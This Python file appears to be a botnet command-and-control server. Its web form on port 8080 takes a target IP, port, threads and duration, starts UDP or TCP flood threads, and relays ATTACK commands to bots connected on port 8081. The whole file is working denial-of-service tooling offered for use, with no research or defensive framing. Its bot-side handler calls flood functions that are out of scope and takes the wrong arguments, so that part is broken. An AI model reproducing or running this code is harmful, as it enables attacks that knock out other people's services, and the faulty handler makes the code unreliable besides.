import http.server
import socketserver
from urllib.parse import parse_qs
import threading
import socket
import random
import time
import json

# Ports
WEB_PORT = 8080
BOT_PORT = 8081

# Global list to keep track of connected bots
bots = []

class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.path = '/index.html'
        elif self.path == '/styles.css':
            self.path = '/styles.css'
        return super().do_GET()

    def do_POST(self):
        if self.path == '/submit':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            params = parse_qs(post_data)
            
            ip = params.get('ip', [''])[0]
            port = int(params.get('port', [''])[0])
            choice = params.get('choice', [''])[0]
            times = int(params.get('times', [''])[0])
            threads = int(params.get('threads', [''])[0])
            duration = int(params.get('duration', [''])[0])
            
            # Run the attack based on the parameters
            self.run_attack(ip, port, choice, times, threads, duration)

            response_html = f'''
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Attack Sent</title>
                <link rel="stylesheet" href="styles.css">
            </head>
            <body>
                <div class="container">
                    <h1>Attack Sent</h1>
                    <p><strong>IP:</strong> {ip}</p>
                    <p><strong>Port:</strong> {port}</p>
                    <p><strong>Choice:</strong> {choice}</p>
                    <p><strong>Times:</strong> {times}</p>
                    <p><strong>Threads:</strong> {threads}</p>
                    <p><strong>Duration:</strong> {duration} seconds</p>
                    <a href="/">Go Back</a>
                </div>
            </body>
            </html>
            '''
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(response_html.encode('utf-8'))
        else:
            self.send_error(404, "File Not Found")

    def run_attack(self, ip, port, choice, times, threads, duration):
        def udp_flood():
            data = random._urandom(1024)
            start_time = time.time()
            while time.time() - start_time < duration:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    addr = (ip, port)
                    for _ in range(times):
                        s.sendto(data, addr)
                except Exception as e:
                    print(f"UDP Flood Error: {e}")

        def tcp_flood():
            data = random._urandom(1024)
            start_time = time.time()
            while time.time() - start_time < duration:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip, port))
                    for _ in range(times):
                        s.send(data)
                    s.close()
                except Exception as e:
                    print(f"TCP Flood Error: {e}")

        attack_method = udp_flood if choice.lower() == 'y' else tcp_flood

        # Send attack instructions to all bots
        payload = {
            'ip': ip,
            'port': port,
            'choice': choice,
            'times': times,
            'duration': duration
        }
        for bot in bots:
            try:
                bot.sendall(f"ATTACK {json.dumps(payload)}".encode('utf-8'))
                print("Sent attack payload to bot")
            except Exception as e:
                print(f"Error sending payload to bot: {e}")

        # Start attack on the server itself
        for _ in range(threads):
            th = threading.Thread(target=attack_method)
            th.start()

def handle_client_connection(client_socket):
    global bots
    try:
        # Register the bot
        client_socket.sendall("REGISTER".encode('utf-8'))
        print("Bot registered.")

        while True:
            data = client_socket.recv(4096).decode('utf-8')
            if data:
                print(f"Received data from bot: {data}")
                if data.startswith("ATTACK"):
                    _, attack_data = data.split(" ", 1)
                    payload = json.loads(attack_data)
                    # Perform the attack with the received parameters
                    attack_thread = threading.Thread(target=handle_attack, args=(payload,))
                    attack_thread.start()
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()
        if client_socket in bots:
            bots.remove(client_socket)
            print(f"Bot disconnected. Total bots: {len(bots)}")

def handle_attack(payload):
    ip = payload['ip']
    port = payload['port']
    choice = payload['choice']
    times = payload['times']
    duration = payload['duration']
    
    attack_method = udp_flood if choice.lower() == 'y' else tcp_flood

    # Start the attack
    attack_thread = threading.Thread(target=attack_method, args=(ip, port, times, duration))
    attack_thread.start()

def start_web_server():
    with socketserver.TCPServer(("", WEB_PORT), MyRequestHandler) as httpd:
        print(f"Web server serving on port {WEB_PORT}")
        httpd.serve_forever()

def start_bot_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("", BOT_PORT))
    server.listen(5)
    print(f"Bot server listening on port {BOT_PORT}")

    while True:
        client_socket, addr = server.accept()
        print(f"Accepted connection from {addr}")
        bots.append(client_socket)  # Keep track of the connected bot
        client_handler = threading.Thread(target=handle_client_connection, args=(client_socket,))
        client_handler.start()

if __name__ == "__main__":
    # Start web server in a separate thread
    web_server_thread = threading.Thread(target=start_web_server)
    web_server_thread.start()

    # Start bot server
    start_bot_server()

